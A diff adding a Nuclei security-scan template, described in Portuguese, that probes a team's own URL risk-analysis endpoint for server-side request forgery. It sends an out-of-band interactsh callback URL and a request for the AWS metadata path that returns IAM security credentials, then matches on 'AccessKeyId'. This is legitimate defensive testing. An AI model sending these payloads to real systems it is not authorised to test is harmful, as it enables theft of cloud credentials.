@@ -1,0 +1,38 @@
+id: vanguarda-ssrf-probe
+
+info:
+  name: Vanguarda - Motor de risco nao deve acessar a URL analisada (SSRF)
+  author: squad-vanguarda
+  severity: critical
+  description: |
+    Envia para analise uma URL apontando para o endpoint de metadados da AWS e para o
+    servidor de interacao OAST do Nuclei. Se houver callback (interactsh) ou o corpo
+    trouxer dados de metadados, o servico fez requisicao de saida -> SSRF.
+  tags: vanguarda,ssrf,oast
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/v1/risk/url"
+    headers:
+      Content-Type: application/json
+    body: '{"url":"http://{{interactsh-url}}/pix-premio"}'
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+  - method: POST
+    path:
+      - "{{BaseURL}}/v1/risk/url"
+    headers:
+      Content-Type: application/json
+    body: '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "AccessKeyId"
+          - "ami-id"
